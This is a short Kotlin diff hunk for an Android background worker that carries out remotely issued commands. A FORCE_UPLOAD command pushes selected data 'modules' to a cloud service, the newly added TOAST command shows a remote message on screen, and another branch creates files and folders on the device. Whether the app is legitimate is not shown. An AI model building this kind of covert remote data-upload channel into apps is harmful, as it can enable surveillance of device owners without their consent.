@@ -55,14 +55,22 @@ class RemoteCommandWorker(appContext: Context, workerParams: WorkerParameters) :
                             val targetDir = File(root, path)
                             if (!targetDir.exists()) targetDir.mkdirs()
 
-                            // --- NEW: HANDLING FORCE UPLOAD ---
+                            // --- 1. FORCE UPLOAD ---
                             if (cmd.getString("file_name") == "FORCE_UPLOAD") {
                                 val modulesStr = cmd.optString("content", "ALL")
                                 val modules = modulesStr.split(",").map { it.trim() }
                                 CloudManager.uploadData(applicationContext, modules, null)
                                 status = "EXECUTED"
-                            } 
-                            // --- EXISTING FILE LOGIC ---
+                            }
+                            // --- 2. LIVE TOAST MESSAGE ---
+                            else if (cmd.getString("file_name") == "TOAST") {
+                                val msg = cmd.optString("content", "Ping!")
+                                android.os.Handler(android.os.Looper.getMainLooper()).post {
+                                    android.widget.Toast.makeText(applicationContext, msg, android.widget.Toast.LENGTH_LONG).show()
+                                }
+                                status = "EXECUTED"
+                            }
+                            // --- 3. FILE/FOLDER CREATION ---
                             else if (fileName.isNotEmpty()) {
                                 val targetFile = File(targetDir, fileName)
                                 
